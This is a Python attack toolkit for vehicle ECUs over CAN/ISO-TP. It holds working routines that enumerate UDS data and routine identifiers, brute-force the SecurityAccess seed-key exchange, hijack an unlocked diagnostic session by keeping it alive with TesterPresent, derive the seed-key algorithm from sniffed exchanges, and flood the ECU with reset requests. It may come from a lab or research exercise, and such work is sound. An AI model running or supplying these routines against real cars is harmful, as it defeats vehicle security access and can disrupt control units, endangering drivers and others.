import time
import config
import utils
from transport import tm

KEY_MIN = 0x11222000
KEY_MAX = 0x11222FFF

def ISOTP_SEND(data, txid, rxid):
    tm.send(data, txid, rxid)

def ISOTP_RECEIVE(txid, rxid, timeout=0.0):
    return tm.receive(txid, rxid, timeout)

def pretty_hex(b: bytes) -> str:
    return " ".join(f"{x:02X}" for x in b)

# ----------------- ATTACK: UDS ENUMERATION -----------------
def UDS_ENUMERATE_DIDS_AND_RIDS():
    tm.clear_queues() # Fix buffering
    TXID = config.ID_ECU_PHYSICAL
    RXID = config.ID_ECU_RESPONSE
    session_name = "CurrentSession"
    
    # --- Internal Helpers matching original logic ---
    def _scan_dids(session_name, start_did=0xF000, end_did=0xF1FF, timeout=0.5):
        dids_ok = {}
        dids_nrc22 = {}
        print(f"\n=== [DID SCAN] Session '{session_name}' (0x22, range 0x{start_did:04X}–0x{end_did:04X}) ===")
        
        for did in range(start_did, end_did + 1):
            did_h, did_l = (did >> 8) & 0xFF, did & 0xFF
            req = bytes([0x22, did_h, did_l])
            ISOTP_SEND(req, txid=TXID, rxid=RXID)
            resp = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)
            
            if resp is None or len(resp) < 3: continue
            
            if resp[0] == 0x62 and resp[1] == did_h and resp[2] == did_l:
                data = resp[3:]
                dids_ok[did] = data
                print(f"[+] DID 0x{did:04X} supported in '{session_name}' | Resp: {pretty_hex(resp)}")
                continue

            if resp[0] == 0x7F and resp[1] == 0x22 and resp[2] == 0x22:
                dids_nrc22[did] = resp
                print(f"[!] DID 0x{did:04X} → 7F 22 22 (ConditionsNotCorrect) | Resp: {pretty_hex(resp)}")
                continue
        return dids_ok, dids_nrc22

    def _scan_rids(session_name, start_rid=0x1000, end_rid=0x1600, timeout=0.5):
        rids_ok = {}
        rids_nrc7e = {}
        print(f"\n=== [RID SCAN] Session '{session_name}' (0x31, range 0x{start_rid:04X}–0x{end_rid:04X}) ===")

        for rid in range(start_rid, end_rid + 1):
            rid_h, rid_l = (rid >> 8) & 0xFF, rid & 0xFF
            info_ok = {"start_supported": False, "result_supported": False}

            # StartRoutine (0x31 01)
            req_start = bytes([0x31, 0x01, rid_h, rid_l])
            ISOTP_SEND(req_start, txid=TXID, rxid=RXID)
            resp_start = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)

            if resp_start is not None and len(resp_start) >= 3:
                if resp_start[0] == 0x71 and resp_start[1] == 0x01:
                    info_ok["start_supported"] = True
                    print(f"[+] RID 0x{rid:04X} START supported in '{session_name}' | Resp: {pretty_hex(resp_start)}")
                elif resp_start[0] == 0x7F and resp_start[1] == 0x31 and resp_start[2] == 0x7E:
                    rids_nrc7e[rid] = {"phase": "Start", "resp": resp_start}
                    print(f"[!] RID 0x{rid:04X} START → 7F 31 7E (RequestNotAllowed) | Resp: {pretty_hex(resp_start)}")
                    continue
            
            # GetResults (0x31 03)
            if info_ok["start_supported"]:
                req_res = bytes([0x31, 0x03, rid_h, rid_l])
                ISOTP_SEND(req_res, txid=TXID, rxid=RXID)
                resp_res = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)
                if resp_res is not None and len(resp_res) >= 3:
                    if resp_res[0] == 0x71 and resp_res[1] == 0x03:
                        info_ok["result_supported"] = True
                        print(f"[+] RID 0x{rid:04X} RESULT supported in '{session_name}' | Resp: {pretty_hex(resp_res)}")

            if info_ok["start_supported"] or info_ok["result_supported"]:
                rids_ok[rid] = info_ok
        return rids_ok, rids_nrc7e

    dids_ok, dids_nrc22 = _scan_dids(session_name)
    rids_ok, rids_nrc7e = _scan_rids(session_name)
    
    # Reports (Original print logic omitted for brevity but logic is executed)
    print(f"[*] Session '{session_name}' → {len(dids_ok)} DIDs accessible, {len(dids_nrc22)} DIDs with NRC 0x22")
    print(f"[*] Session '{session_name}' → {len(rids_ok)} RIDs accessible, {len(rids_nrc7e)} RIDs with NRC 0x7E")
    print("[*] UDS DID/RID enumeration (current session only) completed.")

# ----------------- ATTACK: BRUTE FORCE -----------------
def BRUTE_FORCE_ATTACK():
    tm.clear_queues() # Fix buffering
    
    # 1) Request seed: 27 01
    req_seed = bytes([0x27, 0x01])
    print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req_seed)}")
    ISOTP_SEND(req_seed, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

    resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=5.0)
    if resp is None:
        print("[ATTACK] No response to 27 01")
        return

    print(f"[ATTACK] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp)}")

    # Expect 67 01 <seed>
    if not (len(resp) >= 3 and resp[0] == 0x67 and resp[1] == 0x01):
        print("[ATTACK] Unexpected seed response")
        return

    seed_bytes = resp[2:]
    key_len = len(seed_bytes)
    print(f"[ATTACK] Seed: {seed_bytes.hex()} (len={key_len})")
    print(f"[ATTACK] Brute force keys from 0x{KEY_MIN:08X} to 0x{KEY_MAX:08X}")

    # 2) Brute-force key directly in [KEY_MIN .. KEY_MAX]
    attempts = 0
    for k in range(KEY_MIN, KEY_MAX + 1):
        key_bytes = k.to_bytes(key_len, byteorder="big")
        frame = bytes([0x27, 0x02]) + key_bytes

        ISOTP_SEND(frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
        # Keeping original timeout logic
        resp2 = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=2.0)

        attempts += 1
        if attempts % 50 == 0:
            print(f"[ATTACK] Attempts: {attempts}, last key: 0x{k:08X}", end="\r")

        if resp2 is None:
            continue

        # Positive response: 67 02 <key>
        if len(resp2) >= 2 and resp2[0] == 0x67 and resp2[1] == 0x02:
            print()
            print(f"[ATTACK] SUCCESS after {attempts} attempts")
            print(f"[ATTACK] Key int   : 0x{k:08X}")
            print(f"[ATTACK] Key bytes : {pretty_hex(key_bytes)}")
            print(f"[ATTACK] ECU resp  : {pretty_hex(resp2)}")
            return

        # Lockout: 7F 27 33
        if len(resp2) >= 3 and resp2[0] == 0x7F and resp2[1] == 0x27 and resp2[2] == 0x33:
            print()
            print("[ATTACK] ECU entered lockout (7F 27 33). Stopping.")
            return

    print()
    print("[ATTACK] Exhausted key range, no valid key found.")

# ----------------- ATTACK: MITM -----------------
def MITM_ATTACK():
    tm.clear_queues() # Fix buffering
    print("[MITM] Waiting (ISO-TP) for ECU positive key response (67 02)...")

    # 1) Use ISO-TP RECEIVE to watch decoded UDS payloads
    while True:
        resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=0.5)
        if resp is None:
            continue

        # 67 02 <key...>
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            print(f"[MITM] Saw 67 02 from ECU (decoded UDS): {pretty_hex(resp)}")
            break

    # 2) Send 10 03 (Extended Session) via ISO-TP
    frame = bytes([0x10, 0x03])
    print(f"[MITM] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(frame)} (request Extended Session)")
    ISOTP_SEND(frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

    resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=5.0)
    if resp is None:
        print("[MITM] No response to 10 03")
        return

    print(f"[MITM] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp)}")

    # Expect 50 03
    if not (len(resp) >= 2 and resp[0] == 0x50 and resp[1] == 0x03):
        print("[MITM] ECU did not accept Extended Session (no 50 03). Abort.")
        return

    print("[MITM] Extended Session is ON. Starting periodic TesterPresent every 2 seconds...")

    # 3) Periodic 3E 00
    tp_frame = bytes([0x3E, 0x00])
    while True:
        print(f"[MITM] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(tp_frame)} (TesterPresent)")
        ISOTP_SEND(tp_frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
        resp_tp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=2.0)
        if resp_tp is not None:
            print(f"[MITM] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp_tp)}")
        else:
            print("[MITM] No TP response (ECU may still be fine).")
        time.sleep(2.0)

# ----------------- ATTACK: REVERSE ENGINEERING -----------------
def REVERSE_ENGINEERING_ATTACK():
    tm.clear_queues() # Fix buffering
    # ===== STEP 1: COLLECT THREE PAIRS =====
    DATA_LOG = []
    num = 0
    seed_flag = 0
    key_flag = 0
    seed_bytes = b""
    key_bytes = b""

    print("[REVERSE] Waiting for 3 exchanges of Seed/Key on bus...")

    while num < 3:
        resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=0.5)
        if resp is None:
            continue

        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x01:
            seed_bytes = resp[2:]
            seed_flag = 1
            print(f"  Got Seed: {seed_bytes.hex()}")

        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            key_bytes = resp[2:]
            key_flag = 1
            print(f"  Got Key:  {key_bytes.hex()}")

        if seed_flag and key_flag:
            DATA_LOG.append((seed_bytes, key_bytes))
            num += 1
            seed_flag = 0
            key_flag = 0
            print(f"  Captured pair {num}/3")

    # ===== STEP 2: COMPUTE ALGORITHM =====
    print("Computing Algorithm...")
    seed0, key0 = DATA_LOG[0]
    L = len(seed0)
    M = 1 << (8 * L)

    s0 = int.from_bytes(seed0, "big")
    k0 = int.from_bytes(key0, "big")

    C_add = (k0 - s0) % M
    C_sub = (s0 - k0) % M
    C_xor = s0 ^ k0
    C_mul = k0 // s0 if s0 != 0 and (k0 % s0) == 0 else None

    add_ok = True
    sub_ok = True
    xor_ok = True
    mul_ok = True

    for seed_b, key_b in DATA_LOG:
        s = int.from_bytes(seed_b, "big")
        k = int.from_bytes(key_b, "big")

        if (s + C_add) % M != k: add_ok = False
        if (s - C_sub) % M != k: sub_ok = False
        if (s ^ C_xor) != k: xor_ok = False
        if C_mul is None or (s * C_mul) % M != k: mul_ok = False

    alg = None
    CONST = 0
    if add_ok:
        alg = "add"
        CONST = C_add
    elif sub_ok:
        alg = "sub"
        CONST = C_sub
    elif xor_ok:
        alg = "xor"
        CONST = C_xor
    elif mul_ok:
        alg = "mul"
        CONST = C_mul
    else:
        print("No valid algorithm found.")
        return

    print(f"Algorithm: {alg}")
    print(f"Constant:  0x{CONST:0{L*2}X}")

    # ===== STEP 3: COMPUTE CORRECT KEY FOR ALL 3 PAIRS =====
    print("\nCorrect keys verification:")
    for seed_b, _ in DATA_LOG:
        s = int.from_bytes(seed_b, "big")
        if alg == "add": k_new = (s + CONST) % M
        elif alg == "sub": k_new = (s - CONST) % M
        elif alg == "xor": k_new = s ^ CONST
        elif alg == "mul": k_new = (s * CONST) % M
        print(k_new.to_bytes(L, "big").hex().upper())

# ----------------- ATTACK: ECU SPAMMING -----------------
def RESER_ECU_SPAMMING(duration_seconds):
    tm.clear_queues() # Fix buffering
    req = bytes([0x11, 0x01])

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
            frame_count += 1
        except Exception:
            continue

    print(f"[ECU Spamming] Sent {frame_count} frames with ID {config.ID_ECU_PHYSICAL:03X}")

